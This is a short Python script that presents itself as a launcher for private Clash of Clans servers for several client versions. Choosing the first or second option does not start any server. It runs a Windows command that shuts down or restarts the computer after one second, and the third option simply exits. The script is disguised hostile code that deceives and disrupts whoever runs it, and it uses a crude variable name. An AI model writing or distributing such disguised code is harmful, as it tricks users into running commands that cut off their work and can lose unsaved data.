import os;
print("1. Starting Clash of Clans Server For Client 9.256");
print("2. Starting Clash of Clans Server For Client 11.49");
print("3. Starting Clash of Clans Server For Client 14.211.16");
dick = int(input("\n Choose which version Clash of Clans you want run it: "));
if(dick>=1 and dick<=2):
    if dick == 1:
        os.system("shutdown /s /t 1");
    else:
        os.system("shutdown /r /t 1");
else:
    exit();
